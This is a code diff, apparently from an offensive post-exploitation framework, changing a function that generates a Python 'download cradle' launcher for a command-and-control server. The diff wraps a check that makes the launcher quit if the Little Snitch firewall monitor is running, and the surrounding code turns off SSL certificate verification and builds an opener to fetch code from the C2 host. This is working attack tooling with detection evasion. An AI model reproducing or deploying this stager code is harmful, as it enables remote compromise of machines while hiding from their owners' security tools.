@@ -202,7 +202,7 @@ class Stagers:
 
         return server + checksum
 
-    def generate_launcher(self, listenerName, encode=True, userAgent="default", proxy="default", proxyCreds="default",littlesnitch=True):
+    def generate_launcher(self, listenerName, encode=True, userAgent="default", proxy="default", proxyCreds="default",littlesnitch='True'):
         """
         Generate the initial Python 'download cradle' with a specified
         c2 server and a valid HTTP checksum.
@@ -244,14 +244,19 @@ class Stagers:
             launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
         launcherBase += "import sys, urllib2;"
-        if littlesnitch.lower() == 'true':
-            launcherBase += "import re, subprocess;"
-            launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
-            launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
-            launcherBase += "out = ps.stdout.read()\n"
-            launcherBase += "ps.stdout.close()\n"
-            launcherBase += "if re.search(\"Little Snitch\", out):\n"
-            launcherBase += "   sys.exit()\n"
+        try:
+            if littlesnitch.lower() == 'true':
+                launcherBase += "import re, subprocess;"
+                launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
+                launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
+                launcherBase += "out = ps.stdout.read()\n"
+                launcherBase += "ps.stdout.close()\n"
+                launcherBase += "if re.search(\"Little Snitch\", out):\n"
+                launcherBase += "   sys.exit()\n"
+        except Exception as e:
+            p = "[!] Error setting LittleSnitch in stagger: " + str(e)
+            print helpers.color(p, color="Yellow")
+
         
         launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
         launcherBase += "UA='%s';" % (userAgent)
